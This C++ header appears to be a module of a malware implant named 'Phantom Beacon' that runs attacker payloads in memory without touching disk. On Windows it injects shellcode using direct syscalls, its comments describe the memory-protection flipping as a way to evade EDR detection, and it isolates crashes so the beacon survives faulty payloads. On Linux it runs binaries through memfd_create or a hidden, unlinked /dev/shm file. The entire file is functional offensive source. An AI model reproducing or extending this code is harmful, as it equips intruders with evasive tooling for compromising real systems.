#pragma once
// ============================================================================
//  inmemory.h — Phantom Beacon In-Memory Execution (Cross-Platform)
//  ──────────────────────────────────────────────────────────────────────
//  Executes payloads without writing to disk.
//  Windows: Shellcode injection via VirtualAlloc.
//  Linux: Binary execution via memfd_create with legacy fallback.
// ============================================================================

#include <vector>
#include <string>
#include <cstdlib>

#ifdef _WIN32
#include <windows.h>
#else
#include <unistd.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <fcntl.h>
#endif

namespace inmemory {

#ifdef _WIN32
#include "syscalls.h"

// ── Crash isolation for in-process shellcode execution ───────────────
// Faulting shellcode (bad offsets, unimplemented syscalls) raised an access
// violation; an unhandled exception in ANY thread kills the whole process,
// so one bad payload = dead beacon (seen in the field). MinGW has no
// __try/__except, so isolation uses a scoped VEH (AddVectoredExceptionHandler)
// plus a SetUnhandledExceptionFilter installed for the exec thread's
// lifetime: the filter terminates ONLY the faulting thread instead of the
// process, and the join reports the fault to the operator.
struct SehShellcodeArgs { void* addr; volatile bool faulted; DWORD code; };

static LPTOP_LEVEL_EXCEPTION_FILTER g_prev_filter = nullptr;
static SehShellcodeArgs* g_active_seh = nullptr;
static thread_local uint32_t tls_is_exec_thread = 0;

static LONG WINAPI seh_exec_filter(EXCEPTION_POINTERS* ep) {
    if (tls_is_exec_thread && g_active_seh) {
        g_active_seh->faulted = true;
        g_active_seh->code = ep->ExceptionRecord->ExceptionCode;
        // Contain the fault: kill just this thread.
        ExitThread(0xDEAD0001);
    }
    return g_prev_filter ? g_prev_filter(ep) : EXCEPTION_CONTINUE_SEARCH;
}

static DWORD WINAPI seh_run_shellcode(LPVOID p) {
    SehShellcodeArgs* a = (SehShellcodeArgs*)p;
    tls_is_exec_thread = 1;
    g_active_seh = a;
    g_prev_filter = SetUnhandledExceptionFilter(seh_exec_filter);
    ((void(WINAPI*)())a->addr)();
    SetUnhandledExceptionFilter(g_prev_filter);
    g_active_seh = nullptr;
    tls_is_exec_thread = 0;
    return 0;
}

// Execute Shellcode on Windows using DIRECT syscalls + RWX hardening.
//
// RWX hardening: memory is NEVER allocated as PAGE_EXECUTE_READWRITE.
// The shellcode buffer is allocated RW, written, then flipped to RX before
// execution. This defeats EDR heuristics that flag RWX pages (which are
// almost always shellcode).
inline bool run_shellcode(const std::vector<unsigned char>& shellcode, std::string* err_out = nullptr) {
    if (shellcode.empty()) {
        if (err_out) *err_out = "empty shellcode";
        return false;
    }

    PVOID pMemory = nullptr;
    SIZE_T size = shellcode.size();
    
    // 1. Allocate RW (NOT RWX)
    if (syscalls::SysNtAllocateVirtualMemoryDirect(GetCurrentProcess(), &pMemory, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE) != 0) {
        if (err_out) *err_out = "NtAllocateVirtualMemory failed";
        return false;
    }

    // 2. Write while RW
    if (syscalls::SysNtWriteVirtualMemoryDirect(GetCurrentProcess(), pMemory, (PVOID)shellcode.data(), shellcode.size(), nullptr) != 0) {
        if (err_out) *err_out = "NtWriteVirtualMemory failed";
        return false;
    }

    // 3. Flip RW → RX (never RWX)
    DWORD oldProtect;
    if (syscalls::SysNtProtectVirtualMemoryDirect(GetCurrentProcess(), &pMemory, &size, PAGE_EXECUTE_READ, &oldProtect) != 0) {
        if (err_out) *err_out = "NtProtectVirtualMemory failed";
        return false;
    }

    // 4. Execute on a crash-isolated thread: a faulting payload is contained
    //    to its thread (scoped unhandled-exception filter), the beacon joins
    //    briefly and reports. A long-running payload that outlives the join
    //    keeps running detached — the beacon is never wedged.
    static SehShellcodeArgs args;   // static: outlives a detached thread
    args.addr = pMemory;
    args.faulted = false;
    args.code = 0;
    HANDLE hThread = CreateThread(nullptr, 0, seh_run_shellcode, &args, 0, nullptr);
    if (!hThread) {
        if (err_out) *err_out = "CreateThread (SEH exec) failed";
        return false;
    }
    const DWORD join_ms = 15000;
    DWORD waited = 0;
    while (WaitForSingleObject(hThread, 250) == WAIT_TIMEOUT) {
        waited += 250;
        if (waited >= join_ms) {
            // Still running (implant-style payload): detach and report success.
            syscalls::SysNtClose(hThread);
            return true;
        }
    }
    CloseHandle(hThread);
    if (args.faulted) {
        if (err_out) {
            char buf[64];
            _snprintf_s(buf, sizeof(buf), _TRUNCATE,
                "shellcode fault 0x%08lX", (unsigned long)args.code);
            *err_out = buf;
        }
        return false;
    }
    return true;
}
#else
// Execute ELF Binary on Linux via memfd_create with fallback to /dev/shm
inline bool run_binary(const std::vector<unsigned char>& binary, const std::string& args = "") {
    if (binary.empty()) return false;

    // Try to create an anonymous file in memory (Modern Linux, Kernel 3.17+)
    int fd = -1;
#ifndef __ANDROID__
    fd = memfd_create("phantom_mem", MFD_CLOEXEC);
#endif
    // Fallback for older kernels (like Metasploitable 2) and Android
    if (fd == -1) {
        char tmp_path[] = "/dev/shm/.phntmXXXXXX";
        fd = mkstemp(tmp_path);
        if (fd != -1) {
            // Unlink immediately: the file remains accessible via the fd 
            // but is deleted from the directory listing. Stealthy.
            unlink(tmp_path);
        }
    }

    if (fd == -1) return false;

    // Write binary to the anonymous file
    if (write(fd, binary.data(), binary.size()) != (ssize_t)binary.size()) {
        close(fd);
        return false;
    }

    pid_t pid = fork();
    if (pid == 0) { // Child
        // Execute the memory file via /proc/self/fd/
        char fd_path[64];
        snprintf(fd_path, sizeof(fd_path), "/proc/self/fd/%d", fd);
        
        execl(fd_path, "phantom_payload", (char*)NULL);
        _exit(1);
    } else if (pid > 0) { // Parent
        close(fd);
        return true;
    }

    close(fd);
    return false;
}
#endif

} // namespace inmemory
